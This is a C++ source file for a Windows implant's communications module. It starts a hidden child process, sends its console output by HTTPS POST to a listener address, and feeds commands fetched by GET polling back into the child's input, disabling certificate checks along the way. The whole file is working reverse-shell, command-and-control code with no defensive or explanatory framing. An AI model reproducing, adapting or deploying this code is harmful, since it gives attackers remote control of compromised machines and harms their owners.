#include "pch.h"
#include "Comms.h"

void _Comms::RunComms()
{
	// Set up the security attributes struct.
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	// Create the child STDOUT pipe.
	if (!CreatePipe(&hOutputReadTmp, &hOutputWrite, &sa, 0))
		DEBUG_PRINT(("CreatePipe %d", GetLastError()));

	// Create a duplicate of the output write handle for the std error
	// write handle. This is necessary in case the child application
	// closes one of its std output handles.
	if (!DuplicateHandle(GetCurrentProcess(), hOutputWrite,
		GetCurrentProcess(), &hErrorWrite, 0,
		TRUE, DUPLICATE_SAME_ACCESS))
		DEBUG_PRINT(("DuplicateHandle %d", GetLastError()));


	// Create the child input pipe.
	if (!CreatePipe(&hInputRead, &hInputWriteTmp, &sa, 0))
		DEBUG_PRINT(("CreatePipe %d", GetLastError()));


	// Create new output read handle and the input write handles. Set
	// the Properties to FALSE. Otherwise, the child inherits the
	// properties and, as a result, non-closeable handles to the pipes
	// are created.
	if (!DuplicateHandle(GetCurrentProcess(), hOutputReadTmp,
		GetCurrentProcess(),
		&hOutputRead, // Address of new handle.
		0, FALSE, // Make it uninheritable.
		DUPLICATE_SAME_ACCESS))
		DEBUG_PRINT(("DupliateHandle %d", GetLastError()));

	if (!DuplicateHandle(GetCurrentProcess(), hInputWriteTmp,
		GetCurrentProcess(),
		&hInputWrite, // Address of new handle.
		0, FALSE, // Make it uninheritable.
		DUPLICATE_SAME_ACCESS))
		DEBUG_PRINT(("DupliateHandle %d", GetLastError()));;


	// Close inheritable copies of the handles you do not want to be
	// inherited.
	if (!CloseHandle(hOutputReadTmp)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));;
	if (!CloseHandle(hInputWriteTmp)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));


	// Get std input handle so you can close it and force the ReadFile to
	// fail when you want the input thread to exit.
	if ((Comms.hStdIn = GetStdHandle(STD_INPUT_HANDLE)) ==
		INVALID_HANDLE_VALUE)
		DEBUG_PRINT(("GetStdHandle %d", GetLastError()));

	PrepAndLaunchRedirectedChild(hOutputWrite, hInputRead, hErrorWrite);

	// Close pipe handles (do not continue to modify the parent).
	// Need to make sure that no handles to the write end of the
	// output pipe are maintained in this process or else the pipe will
	// not close when the child process exits and the ReadFile will hang.
	if (!CloseHandle(hOutputWrite)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));
	if (!CloseHandle(hInputRead)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));
	if (!CloseHandle(hErrorWrite)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));

	// Launch the thread that gets the input and sends it to the child.
	hThread = CreateThread(NULL, 0, GetAndSendInputThread,
		(LPVOID)hInputWrite, 0, &ThreadId);
	if (hThread == NULL) DEBUG_PRINT(("CreateThread %d", GetLastError()));

	// Read the child's output.
	ReadAndHandleOutput(hOutputRead);

	// Force the read on the input to return by closing the stdin handle.
	if (!CloseHandle(Comms.hStdIn)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));

	// Tell the thread to exit and wait for thread to die.
	Comms.bRunThread = FALSE;

	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
		DEBUG_PRINT(("WaitForSingleObject: %d", GetLastError()));
	if (!CloseHandle(hOutputRead)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));
	//	if (!CloseHandle(hInputWrite)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));

	Sleep(POLL_RATE);
	Comms.bRunThread = TRUE;
}


/////////////////////////////////////////////////////////////////////// 
// PrepAndLaunchRedirectedChild
// Sets up STARTUPINFO structure, and launches redirected child.
///////////////////////////////////////////////////////////////////////
void __fastcall PrepAndLaunchRedirectedChild(HANDLE hChildStdOut,
	HANDLE hChildStdIn,
	HANDLE hChildStdErr)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	// Set up the start up info struct.
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hChildStdOut;
	si.hStdInput = hChildStdIn;
	si.hStdError = hChildStdErr;
	si.wShowWindow = SW_HIDE;


	// Launch the remote process. 
	TCHAR lpszClientPath[500] = TEXT(CHILD_NAME);
	if (!CreateProcess(NULL, lpszClientPath, NULL, NULL, TRUE,
		CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
		DEBUG_PRINT(("CreateProcess %d", GetLastError()));


	// Set global child process handle to cause threads to exit.
	Comms.hChildProcess = pi.hProcess;


	// Close any unnecessary handles.
	if (!CloseHandle(pi.hThread)) DEBUG_PRINT(("CloseHandle %d", GetLastError()));
}


/////////////////////////////////////////////////////////////////////// 
// ReadAndHandleOutput -- POST
// Reads up to 8192 bytes from the remote process' STDOUT
// Sends those bytes to us via POST request
// Exits when remote process exits or pipe breaks.
/////////////////////////////////////////////////////////////////////// 
DWORD WINAPI ReadAndHandleOutput(HANDLE hPipeRead)
{
	CHAR lpBuffer[8192];
	DWORD nBytesRead;
	while (Comms.bRunThread)
	{

		if (!ReadFile(hPipeRead, lpBuffer, sizeof(lpBuffer),
			&nBytesRead, NULL))
		{
			if (GetLastError() == ERROR_BROKEN_PIPE)
				break; // pipe done - normal exit path.
			else
				DEBUG_PRINT(("ReadFile, %d", GetLastError())); // Something bad happened.
			// you need to likely break the pipe i'm guessing
		}
		if (nBytesRead >= 8192)
		{
			DEBUG_PRINT(("Buffer Overun"));
			exit(0);
		}

		lpBuffer[nBytesRead] = '\0';

		DWORD dwSize = sizeof(DWORD);
		DWORD dwData = 0;
		HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
		BOOL bResults = false;

		// WinHttpOpen to obtain an HINTERNET handle.
		hSession = WinHttpOpen(L"Rod of Ages/1.0",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS, 0);

		if (hSession)
			hConnect = WinHttpConnect(hSession, LISTENER_IP,
				LISTENER_PORT, 0);

		if (hConnect)
			hRequest = WinHttpOpenRequest(hConnect, L"POST", NULL, // path 
				NULL, WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

		if (!hConnect)
			break;

		// Allow self-signed/untrusted certificates 
		BOOL retry;
		int result;
		do
		{
			retry = false;
			result = NO_ERROR;

			bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS, 0,
				(LPVOID)lpBuffer, nBytesRead,
				nBytesRead, 0);

			// no retry on success, possible retry on failure
			if (!bResults)
			{
				result = GetLastError();

				if (result == ERROR_WINHTTP_SECURE_FAILURE)
				{
					DWORD dwFlags =
						SECURITY_FLAG_IGNORE_UNKNOWN_CA |
						SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
						SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
						SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

					if (WinHttpSetOption(
						hRequest,
						WINHTTP_OPTION_SECURITY_FLAGS,
						&dwFlags,
						sizeof(dwFlags)))
					{
						retry = true;
					}
				}
				else if (result == ERROR_WINHTTP_RESEND_REQUEST)
				{
					retry = true;
				}
			}
		} while (retry);

		// End the request. 
		if (bResults)
			bResults = WinHttpReceiveResponse(hRequest, NULL);
		else
			break;

		if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
		{
			DEBUG_PRINT(("WinHttpQueryDataAvailable: %d", GetLastError()));
			break;
		}

		// We don't care about POST responses 
		if (hRequest) WinHttpCloseHandle(hRequest);
		if (hConnect) WinHttpCloseHandle(hConnect);
		if (hSession) WinHttpCloseHandle(hSession);

	}
}


/////////////////////////////////////////////////////////////////////// 
// GetAndSendInputThread - GET
// Thread procedure that sends GET requests and pipes their responses
// into the remote process' STDIN.
// This thread ends when the remote application exits.
/////////////////////////////////////////////////////////////////////// 
DWORD WINAPI GetAndSendInputThread(LPVOID lpvThreadParam)
{
	DWORD nBytesRead, nBytesWrote;
	HANDLE hPipeWrite = (HANDLE)lpvThreadParam;

	// Get input from get response and send it to child through the pipe.
	while (Comms.bRunThread)
	{
		DWORD dwSize = sizeof(DWORD);
		DWORD dwData = 0;
		HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
		BOOL bResults = false;

		// Obtain HINTERNET handle and open new HTTP connection
		hSession = WinHttpOpen(L"Rod of Ages/1.0",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS, 0);

		if (hSession)
			hConnect = WinHttpConnect(hSession, LISTENER_IP,
				LISTENER_PORT, 0);

		if (hConnect)
			hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, // path 
				NULL, WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

		if (!hConnect) {
			break;
		}

		// Allow self-signed/untrusted certificates 
		BOOL retry;
		int result;
		do
		{
			retry = false;
			result = NO_ERROR;

			bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS, 0,
				WINHTTP_NO_REQUEST_DATA, 0,
				0, 0);

			// no retry on success, possible retry on failure
			if (!bResults)
			{
				result = GetLastError();

				if (result == ERROR_WINHTTP_SECURE_FAILURE)
				{
					DWORD dwFlags =
						SECURITY_FLAG_IGNORE_UNKNOWN_CA |
						SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
						SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
						SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

					if (WinHttpSetOption(
						hRequest,
						WINHTTP_OPTION_SECURITY_FLAGS,
						&dwFlags,
						sizeof(dwFlags)))
					{
						retry = true;
					}
				}
				else if (result == ERROR_WINHTTP_RESEND_REQUEST)
				{
					retry = true;
				}
			}
		} while (retry);

		// End the request. 
		if (bResults)
			bResults = WinHttpReceiveResponse(hRequest, NULL);

		// Keep checking for data until nothing left. 
		if (!bResults)
		{
			DEBUG_PRINT(("No Results left: %d", GetLastError()));
			CloseHandle(hPipeWrite);
			break;
		}
		// Get responses from the server
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				DEBUG_PRINT(("WinHttpQueryDataAvailable: %d", GetLastError()));
				break;
			}

			// Buffer to hold the request responses
			CHAR* read_buff = new CHAR[(uintptr_t)dwSize + 1];

			if (!read_buff)
			{
				DEBUG_PRINT(("read_buff == 0: %d", GetLastError()));
				break;
			}

			// Clear read_buff
			ZeroMemory(read_buff, (uintptr_t)dwSize + 1);

			// Read the HTTP response into read_buff
			if (!WinHttpReadData(hRequest, (LPVOID)read_buff, dwSize, &nBytesRead))
			{
				DEBUG_PRINT(("WinHttpReadData: %d", GetLastError()));
				break;
			}

			read_buff[nBytesRead] = '\0'; // Null terminate the operator input

			// Write the GET response into the remote process STDIN
			if (!WriteFile(hPipeWrite, read_buff, nBytesRead, &nBytesWrote, NULL))
			{
				if (GetLastError() == ERROR_NO_DATA)
					break; // Pipe was closed (normal exit path).
				else
					DEBUG_PRINT(("WriteFile %d", GetLastError()));
				break;
			}

			delete[] read_buff;

		} while (dwSize > 0);

		if (hRequest) WinHttpCloseHandle(hRequest);
		if (hConnect) WinHttpCloseHandle(hConnect);
		if (hSession) WinHttpCloseHandle(hSession);

	}
	return 0;
}

